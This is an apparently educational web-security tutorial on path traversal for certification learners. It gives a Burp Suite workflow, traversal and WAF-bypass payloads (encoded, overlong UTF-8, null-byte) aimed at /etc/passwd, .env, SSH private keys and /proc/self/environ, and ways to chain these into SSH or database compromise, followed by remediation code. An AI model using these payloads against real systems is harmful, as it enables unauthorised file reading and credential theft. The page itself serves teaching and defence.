Path Traversal (Directory Traversal)

A widespread vulnerability where user input is incorporated into file paths without proper validation, allowing attackers to escape the intended directory and read arbitrary files on the server (or write files in vulnerable cases).

High BSCP Beginner

Real-World Analogy

Library Shelf Navigation

Imagine a library where you can request any book by specifying a shelf number. You ask the librarian, "Please get me the book on shelf 5." They return it without question. Now what if you ask, "Please get me the book on shelf ../../../manager's office/employee_salaries.pdf"? If the librarian literally follows your path · going to shelf 5, then up three levels (../..) to exit the book section entirely, then entering the manager's office · they'd hand you confidential files you were never supposed to see. That's path traversal. The server blindly follows the path you provide, allowing you to navigate outside the intended directory.

On Day 2, inject ../../../etc/passwd into any parameter that looks like it reads a file: ?file=, ?page=, ?path=, ?template=, ?document=, download endpoints. Look for the word "root" in the response, or a suddenly different response length. Mark it and move on.

/etc/nginx/sites-enabled/default     # web server config

Chain it: Path traversal → read .env file → find API keys or DB password → SQLi or direct DB access. Or: read SSH private key → SSH into the server.

How It Works

Path traversal is a simple but powerful vulnerability. When an application constructs file paths using user input, it may fail to validate or sanitize the input. Attackers exploit this by:

  1. Identify a file-serving parameter. Look for parameters like file, path, page, template, or doc.
  2. Use ../ to traverse up directories. Each ../ moves up one directory level. ../../ moves up two levels, etc.
  3. Navigate to the target file. Construct a path that exits the intended directory and reaches sensitive files like /etc/passwd.
  4. Retrieve the file. If the path is valid and readable by the web server process, the file content is returned in the response.

Why it works: The server trusts user input when constructing filesystem paths. Without validation, ../ sequences are treated as legitimate path components.

Where to Look

Path traversal can appear in many contexts:

  • File serving parameters: file=, path=, filename=, page=
  • Template/include mechanisms: template=, include=, lang= (language files)
  • Download endpoints: download.php?file=document.pdf
  • API endpoints: /api/files/123 where the ID is user-controlled
  • Log viewers: log= parameter to view application logs
  • Content rendering: Features that render markdown or document content from a path
  • Static file serving: /assets/filename where filename is user-supplied

Common vulnerable patterns:

http://target.com/download?file=report.pdf
http://target.com/page?page=home.html
http://target.com/api/document/123
http://target.com/view?template=header.html

Burp Suite Workflow

1
Identify file-serving functionality. Navigate to a page with a file parameter (download, view, page, etc.). Intercept the request in Burp Proxy. 
GET /download?file=report.pdf HTTP/1.1
Host: target.com
2
Send to Repeater. Right-click the request and send it to Repeater for testing.
3
Test with ../ sequences. Replace the filename with traversal sequences. Start with one level up: 
GET /download?file=../../../etc/passwd HTTP/1.1
Try different numbers of ../ sequences. On Linux/Unix, /etc/passwd is at the root, so you may need several levels.
4
Observe the response. If the file is readable, the response body will contain the file content. If you see user accounts and hashes, you've found the vulnerability. 
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
5
If ../ is blocked, try encoded versions. The server may filter ../ but miss encoded versions: 
%2e%2e%2f         (URL encoded)
%252e%252e%252f   (double URL encoded)
..%252f           (mixed encoding)
%2e%2e/
6
Try absolute paths. If relative paths are blocked, try absolute paths directly: 
GET /download?file=/etc/passwd HTTP/1.1
7
Try null byte termination (legacy systems). On older systems, null bytes truncate strings: 
file=../../../../etc/passwd%00.pdf
The server reads up to the null byte, ignoring the .pdf suffix.
8
Test common sensitive files. Once you confirm traversal works, read various sensitive files to assess impact.

WAF Bypass Techniques

URL Encoding Levels

Many WAFs filter literal ../ but miss encoded versions:

Single URL encoding:   %2e%2e%2f
Double URL encoding:   %252e%252e%252f
Mixed encoding:        ..%2f
Partial encoding:      %2e%2e/

Case and Mixed Encoding

..%2F       (lowercase %2f)
..%2f       (different case)
%2E%2E%2F   (uppercase dots)

16-Bit Unicode Encoding

Some systems process 16-bit Unicode even in URL context:

%c0%ae%c0%ae%c0%af     (overlong UTF-8 encoding of ../)
%e0%80%ae              (alternative overlong UTF-8)

Backslash + Forward Slash Mix (Windows)

..\.
..%5c          (encoded backslash)
..\..%2f      (mixed separators)

Dot Variations (if dots are filtered)

If literal dots are blocked:

%2e%2e%2f     (encoded dots and slash)
%252e%252e%252f  (double encoded)

Absolute Path Bypass

If relative path traversal is blocked, try absolute paths directly:

Original: file=../../etc/passwd  (blocked)
Bypass:   file=/etc/passwd       (not matched by ../ filter)

Case Sensitivity Tricks

../ vs ../   (if inconsistently validated)
File vs file (parameter name case)
Exploit case-insensitive filesystems

Null Byte Termination

Legacy systems (PHP < 5.3.4) ignore content after %00:

../../../../etc/passwd%00.pdf
Request stops at null byte, .pdf is ignored

Exploitation & Impact

Read Application Config Files

Impact: Critical. Config files often contain secrets:

  • .env file: Database passwords, API keys, JWT secrets.
  • database.yml (Rails): Database credentials in plaintext.
  • config.php: API keys, third-party credentials.
  • web.config (IIS): Connection strings with passwords.
  • .git/config: Repository credentials.
Payload: ../../../.env
Response:
DATABASE_PASSWORD=SecurePass123
AWS_SECRET_KEY=AKIA2KJF...
JWT_SECRET=super_secret_key

Enumerate System Users

Impact: High. /etc/passwd reveals all users and their home directories:

Payload: ../../../etc/passwd
Response:
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
user1:x:1000:1000:User One:/home/user1:/bin/bash

Extract SSH Private Keys

Impact: Critical. SSH keys allow login to other systems:

Payload: ../../../home/user/.ssh/id_rsa
Response: [RSA PRIVATE KEY]
---BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHI...
---END OPENSSH PRIVATE KEY---

Read Application Source Code

Impact: Critical. Source code reveals:

  • Hard-coded credentials or API keys.
  • Logic flaws and additional vulnerabilities.
  • Database schema and internal APIs.
  • Authentication/authorization mechanisms.
Payload: ../../../var/www/html/index.php
Response: [Full PHP source code]

Retrieve Sensitive Environment Variables

Impact: High. Process environment variables may contain secrets:

Payload: ../../../proc/self/environ
Response: (contains full environment)

Access System Information

Impact: Medium. System files reveal infrastructure details:

  • /etc/hostname: Server name.
  • /etc/os-release: Operating system version.
  • /proc/version: Kernel version.
  • Web server logs: Access patterns, other usernames, etc.

Database Compromise

Impact: Critical. With database credentials from config files:

  • Direct database access (dump all data).
  • Modify or delete data.
  • Execute stored procedures or database functions.

Lateral Movement

Impact: High. SSH keys and credentials enable pivot attacks:

  • Use stolen SSH keys to access other servers.
  • Use database credentials to compromise databases on internal networks.
  • Exploit other systems using extracted credentials.

Remediation

1. Use Basename to Strip Path Components

Extract only the filename, removing any directory traversal:

const path = require('path');
const userInput = request.query.file;
const filename = path.basename(userInput);  // Strips all ../ sequences
const filepath = path.join('/uploads', filename);
fs.readFile(filepath, (err, data) => { ... });

2. Resolve Path and Validate Prefix

Convert to absolute path and verify it stays within intended directory:

const path = require('path');
const uploadDir = path.resolve('/var/www/uploads');
const userInput = request.query.file;
const fullPath = path.resolve(uploadDir, userInput);

if (!fullPath.startsWith(uploadDir)) {
  throw new Error('Path traversal detected');
}

fs.readFile(fullPath, (err, data) => { ... });

3. Whitelist Allowed Filenames

Only serve explicitly approved files:

const ALLOWED_FILES = ['report.pdf', 'summary.html', 'data.json'];
const requested = request.query.file;
if (!ALLOWED_FILES.includes(requested)) {
  return response.status(403).send('File not allowed');
}
fs.readFile('/public/' + requested, ...);

4. Use a File ID Mapping Instead of Paths

Map user-visible IDs to actual filenames (best practice):

const FILE_MAP = {
  '1': '/var/www/docs/report.pdf',
  '2': '/var/www/docs/summary.pdf',
};

const fileId = request.query.id;
if (!FILE_MAP[fileId]) {
  return response.status(404).send('Not found');
}
const filepath = FILE_MAP[fileId];
fs.readFile(filepath, ...);

5. Never Pass User Input Directly to Filesystem Functions

This is the core principle · always validate before use:

// VULNERABLE
fs.readFile(request.query.file, ...);

// SECURE
const filename = path.basename(request.query.file);
fs.readFile(path.join('/safe/dir', filename), ...);

6. Implement Access Control

Ensure users can only access their own files:

const userId = request.user.id;
const fileOwnerId = database.getFileOwner(fileId);
if (userId !== fileOwnerId && !isAdmin(userId)) {
  return response.status(403).send('Unauthorized');
}

7. Use Secure APIs

Some frameworks provide safe file serving:

  • Express.js: Use sendFile() with strict path validation.
  • Rails: Use render :file with validated paths.
  • PHP: Use readfile() with validated paths, not user input.

8. Log & Monitor File Access

Alert on suspicious patterns:

  • Requests containing ../ or URL-encoded variations.
  • Attempts to access files outside the intended directory.
  • Access to sensitive files like .env, config.php, etc.

Common Beginner Mistakes

Only Trying ../

Mistake: Testing ../../../etc/passwd with a fixed number of sequences. If the application is several directories deep, you might need more or fewer ../ levels. Fix: Try multiple sequences: ../, ../../, ../../../, up to ../../../../../ and beyond. The worst case is just a slightly deeper path.

Not Testing Encoded Versions

Mistake: If ../ fails, immediately assuming path traversal isn't possible. Simple filters block literal ../ but miss URL-encoded versions. Fix: Always test %2e%2e%2f (URL encoded) and %252e%252e%252f (double encoded). These are critical bypass techniques.

Not Testing Windows Paths When Unknown OS

Mistake: Assuming the target is Linux and only trying Unix paths. Windows servers are equally common. Fix: When the OS is unknown, test both ../../../../etc/passwd (Linux) and C:\Windows\win.ini (Windows). Try both conventions.

Only Looking for /etc/passwd

Mistake: Testing path traversal only for /etc/passwd and giving up if it fails. But the vulnerability might still allow reading application config files. Fix: Once you confirm traversal works, read .env, config.php, web.config, and source code files. These are often more valuable than /etc/passwd.

Forgetting Absolute Paths

Mistake: If relative path traversal is blocked, assuming path traversal doesn't exist. But absolute paths might work. Fix: Try /etc/passwd directly without any ../ sequences. Filters often check for ../ but allow absolute paths.

Ignoring Null Byte Bypass

Mistake: On legacy systems, file extension validation can be bypassed with %00 (null byte). Fix: Try ../../../../etc/passwd%00.jpg. The null byte terminates the string, and the .jpg extension is ignored.

🔗 See Also · Attack Chains

Path traversal is rarely the end goal · it's usually the first step in a larger chain.

📂 File Upload Combine path traversal in the upload filename with a webshell payload · upload to a web-accessible directory. 📡 SSRF SSRF with file:// protocol achieves the same result as path traversal · read arbitrary server files. 🗄️ SQL Injection Read the app's .env or database.yml via path traversal → find DB credentials → direct database access or SQLi. 📝 SSTI Path traversal in a template-rendering endpoint (e.g., ?page=../../etc/passwd) may trigger SSTI if the file is rendered as a template.
